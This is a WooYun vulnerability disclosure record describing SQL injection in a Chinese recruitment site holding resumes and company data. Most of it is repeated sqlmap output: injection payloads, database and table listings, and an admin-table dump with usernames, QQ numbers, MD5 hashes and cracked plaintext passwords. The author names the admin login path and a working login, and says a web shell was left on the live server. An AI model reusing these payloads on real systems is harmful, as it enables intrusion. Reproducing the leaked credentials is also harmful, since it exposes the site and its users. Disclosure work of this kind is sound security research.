{"id": 70014, "wybug_id": "wooyun-2015-0136001", "wybug_title": "某人才招聘存在SQL注入导致大量简历企业资料泄露可shell", "wybug_corp": "众信人才中介服务有限公司", "wybug_author": "me1ody", "wybug_date": "2015-08-25 21:49", "wybug_open_date": "2015-10-11 09:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-27：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向公众公开  简要描述： 12w简历2w多的企业资料影响站点20多个sql注入getshell 详细说明：  注入点\nhttp://**.**.**.**/detail.php?id=62970\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=62970' AND 8205=8205 AND 'xqPF'='xqPF    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=62970' AND (SELECT 4151 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4151=4151,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sjxy'='sjxy    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=62970' AND (SELECT * FROM (SELECT(SLEEP(60)))JgaB) AND 'MDxp'='MDxp    Type: UNION query    Title: MySQL UNION query (NULL) - 28 columns    Payload: id=-7173' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x78754c674e4669727650,0x716a716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0available databases [7]:[*] cacti[*] information_schema[*] mysql[*] rencai_2012[*] rencai_2014[*] rencai_201407[*] testsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=62970' AND 8205=8205 AND 'xqPF'='xqPF    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=62970' AND (SELECT 4151 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4151=4151,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sjxy'='sjxy    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=62970' AND (SELECT * FROM (SELECT(SLEEP(60)))JgaB) AND 'MDxp'='MDxp    Type: UNION query    Title: MySQL UNION query (NULL) - 28 columns    Payload: id=-7173' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x78754c674e4669727650,0x716a716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0current database:    'rencai_2012'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=62970' AND 8205=8205 AND 'xqPF'='xqPF    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=62970' AND (SELECT 4151 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4151=4151,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sjxy'='sjxy    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=62970' AND (SELECT * FROM (SELECT(SLEEP(60)))JgaB) AND 'MDxp'='MDxp    Type: UNION query    Title: MySQL UNION query (NULL) - 28 columns    Payload: id=-7173' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x78754c674e4669727650,0x716a716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0Database: rencai_2012[60 tables]+----------------------+| ins_ad               || ins_adboard          || ins_admin            || ins_admin_role       || ins_admin_role_priv  || ins_article          || ins_article_cate     || ins_attatch          || ins_company          || ins_company_cate     || ins_company_comments || ins_company_contact  || ins_company_diytpl   || ins_company_favs     || ins_company_info     || ins_company_invite   || ins_company_sites    || ins_company_top      || ins_company_upgrade  || ins_company_vip      || ins_company_window   || ins_content_cate     || ins_flink            || ins_flink_cate       || ins_gonggao          || ins_headhunter       || ins_help             || ins_hh_config        || ins_hh_content       || ins_hh_content_cate  || ins_hh_cooperation   || ins_hh_news          || ins_hh_news_cate     || ins_hh_online_order  || ins_hh_partners      || ins_jobs             || ins_jobs_cate        || ins_jobs_complaint   || ins_jobs_contact     || ins_jobs_info        || ins_mail_queue       || ins_menu             || ins_mess             || ins_nav              || ins_sendresume       || ins_session          || ins_setting          || ins_site_content     || ins_sites            || ins_sms_queue        || ins_users            || ins_users_black      || ins_users_cate       || ins_users_catepar    || ins_users_favs       || ins_users_sites      || ins_viewresume       || ins_weixin           || ins_work_position    || ins_worker           |+----------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=62970' AND 8205=8205 AND 'xqPF'='xqPF    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=62970' AND (SELECT 4151 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4151=4151,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sjxy'='sjxy    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=62970' AND (SELECT * FROM (SELECT(SLEEP(60)))JgaB) AND 'MDxp'='MDxp    Type: UNION query    Title: MySQL UNION query (NULL) - 28 columns    Payload: id=-7173' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x78754c674e4669727650,0x716a716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0Database: rencai_2012Table: ins_admin[6 entries]+----+---------+---------+---------------+---------------------+-----------+-------------+----------+-------------------------------------------+| id | role_id | site_id | qq            | email               | lastip    | username    | lasttime | password                                  |+----+---------+---------+---------------+---------------------+-----------+-------------+----------+-------------------------------------------+| 1  | 2       | 0       | 951636692(鐜嬪康) | 951636692@**.**.**.**    | **.**.**.** | kfwn        | 2009     | 13e311484e63b35e06c0a3718787d609(67939030)          || 2  | 2       | 0       | 1525950257    | 1525950257@**.**.**.**   | **.**.**.** | kfaz        | 2009     | 13e311484e63b35e06c0a3718787d609          || 3  | 8       | 0       | <blank>       | wang1978223@**.**.**.** | **.**.**.** | wn          | 2009     | e5cf362e3b023b7141c9dd8575b14272 (008800) || 4  | 2       | 0       | 2577402148    | 2577402148@**.**.**.**   | **.**.**.** | kfdk        | 2010     | d41d8cd98f00b204e9800998ecf8427e ()       || 5  | 2       | 0       | 1269122938    | 1269122938@**.**.**.**   | **.**.**.** | chenchunhua | 2010     | b51e8dbebd4ba8a8f342190a4b9f08d7 (456456) || 6  | 7       | 0       | <blank>       | <blank>             | **.**.**.** | wurentupian | 2010     | bc498a180d802e984493259367c9e10b          |+----+---------+---------+---------------+---------------------+-----------+-------------+----------+-------------------------------------------+\n解密在http://**.**.**.**后台地址\nhttp://**.**.**.**/admin.php\n账户密码\nwn 008800\n\n\n\n\n\n\n\n\n\n\n其他不多说了都懂 一句话自行删除谢谢   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  其他不多说了都懂 一句话自行删除谢谢   版权声明：转载请注明来源 me1ody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-27 09:07 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}